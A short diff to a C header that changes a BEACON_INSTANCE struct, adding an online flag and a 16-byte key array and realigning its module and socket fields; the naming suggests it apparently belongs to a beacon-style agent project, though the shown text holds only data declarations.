@@ -19,8 +19,9 @@
 
 typedef struct
 {
+	BOOL	IsOnline;
 	ULONG	BeaconId;
-	BOOLEAN	Online;
+	UCHAR	BeaconKeys[ 16 ];
 
 	struct
 	{
@@ -76,8 +77,8 @@ typedef struct
 		FUNC( CryptImportPublicKeyInfo );
 	} api;
 
-	PVOID Module[ 3 ];
-	SOCKET Socket;
+	PVOID	Module[ 3 ];
+	SOCKET	Socket;
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
 #include "crypt/hmac.h"
